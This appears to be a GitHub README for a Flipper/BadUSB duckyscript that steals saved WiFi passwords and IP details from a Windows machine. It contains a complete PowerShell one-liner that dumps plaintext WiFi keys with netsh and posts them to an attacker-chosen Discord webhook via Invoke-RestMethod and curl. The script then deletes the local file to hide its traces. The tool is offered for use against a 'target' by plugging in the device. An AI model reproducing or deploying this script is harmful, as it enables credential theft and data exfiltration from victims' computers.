
<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#getting-started">Getting Started</a></li>
    <li><a href="#Contributing">Contributing</a></li>
    <li><a href="#Version-History">Version History</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

## Description

This is a BadUSB script to grab WiFi passwords from Windows machine and submit to Discord WebHook via POST request.
This is a duckyscript to grab WiFi passwords from Windows machine and submit to Discord WebHook via POST request.
Tested on Windows 10 Professional ( with local administrator rights).
(privilege escilation may be required before deploying--untested without admin perms).
What the uniqueness about my script is, it will generate and .xml file containing the SSID of the target as well as wifi password of target.~~~
The script also generate a txt file with a table containing the target ip address both manual and DHCP along with wifi password included.~~~~~~
After it completes that in miliseconds it will compile both the .xml and .txt into one nice beautiful webhook POST.
See included images for examples


## Version History

* 0.1
    * Initial Release


## Category:	Exfiltration

<p align="right">(<a href="#top">back to top</a>)</p>

### CHANGE:   <\Your Intended Discord WebHook URL/> on ln no.43

### Executing program

* Plug in your device
```
* STRING $url=" <\Your Intended Discord WebHook URL/>"; Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> WiFi-PASS.txt;(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> WiFi-PASS.txt;$Body=@{ content = "$env:computername Stats from Flipper"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@WiFi-PASS.txt" $url ; Remove-Item '.\WiFi-PASS.txt';
```

<p align="right">(<a href="#top">back to top</a>)</p>

## Contact

<div><h2>Cicada Unit</h2></div>
  <p><br/>
  
  <a href="https://github.com/Cicada-Unit/">
    <img src="https://img.shields.io/badge/GitHub-I--Am--Jakoby-blue">
  </a>


  Project Link: [https://github.com/Cicada-Unit/Flipper-Cicada-custom-WIFIgrabber
</p>




